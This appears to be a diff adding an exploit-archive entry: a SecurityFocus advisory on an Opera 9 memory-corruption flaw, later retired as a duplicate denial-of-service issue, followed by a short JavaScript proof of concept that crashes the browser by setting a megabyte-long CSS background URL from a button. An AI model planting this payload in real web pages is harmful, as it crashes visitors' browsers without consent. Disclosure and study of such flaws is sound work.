@@ -1,0 +1,21 @@
+source: http://www.securityfocus.com/bid/19166/info
+
+Opera Web Browser is prone to a memory-corruption vulnerability.
+
+A remote attacker may trigger this issue by enticing a user to visit a malicious website.
+
+This issue has been reported in Opera 9. Other versions may be vulnerable as well.
+
+This BID has been retired because the vendor reported that this issue is a duplicate of BID 18585 (Opera Malicious HTML Processing Denial of Service Vulnerability).
+
+function Demo() {
+	var a = document.createElement('a');
+	var b = 'XXXX';
+	while (b.length <= 1024*1024) b+=b;
+	a.style.background = 'url(https://' + b + ')';
+}
+
+</script>
+
+Clicking the button below may crash your browser!<br><br>
+<input type='button' onClick='Demo()' value='Start Demo!'>
